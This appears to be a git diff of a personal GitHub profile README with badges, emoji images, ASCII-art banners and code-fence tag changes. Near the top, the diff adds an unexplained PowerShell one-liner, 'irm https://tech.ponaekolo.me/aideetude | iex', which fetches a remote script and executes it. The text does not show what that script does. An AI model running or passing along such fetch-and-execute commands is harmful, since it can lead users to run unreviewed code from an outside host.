@@ -2,6 +2,12 @@
 
 <br><br>
 
+```PowerShell
+
+irm https://tech.ponaekolo.me/aideetude | iex
+
+```
+
 [![](https://visitcount.itsvg.in/api?id=ChristND242&icon=5&color=6)](https://visitcount.itsvg.in) <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Symbols/Bubbles.png" alt="Bubbles" width="45" height="45" />
 
 - <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Hand%20gestures/Waving%20Hand%20Medium-Dark%20Skin%20Tone.png" alt="Waving Hand Medium-Dark Skin Tone" width="25" height="25" /> Hi, I’m Christ ND <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Smilies/Beaming%20Face%20with%20Smiling%20Eyes.png" alt="Beaming Face with Smiling Eyes" width="20" height="20" />
@@ -17,7 +23,7 @@ My strong background in computer science allows me to approach challenges with a
 
 I’m excited to collaborate with you! 
 
-```
+```markdown
             ,----------------,              ,---------,
         ,-----------------------,          ,"        ,"|
       ,"                      ,"|        ,"        ,"  |
@@ -41,7 +47,7 @@ I’m excited to collaborate with you!
 
 </details>
 
-```
+```markdown
 ████████████████████████████████████████████████████████████  ██╗  ██╗███████╗██╗     ██╗      ██████╗
 ████████████████████████████████████████████████████████████  ██║  ██║██╔════╝██║     ██║     ██╔═══██╗
 ███████████████████████████████████`.        ╙██████████████  ███████║█████╗  ██║     ██║     ██║   ██║
@@ -98,7 +104,7 @@ You can click the Preview link to take a look at your changes.
 
 <!-- Proudly created with GPRM ( https://gprm.itsvg.in ) , https://animated-fluent-emoji.vercel.app/, https://patorjk.com/software/taag/#p=testall&h=3&v=1&c=c%2B%2B&f=Graffiti&t=Christ%20ND-->
 
-```txt
+```markdown
  
 //            _____                   _____                   _____                   _____                   _____            _____                            _____                   _____          
 //           /\    \                 /\    \                 /\    \                 /\    \                 /\    \          /\    \                          /\    \                 /\    \         
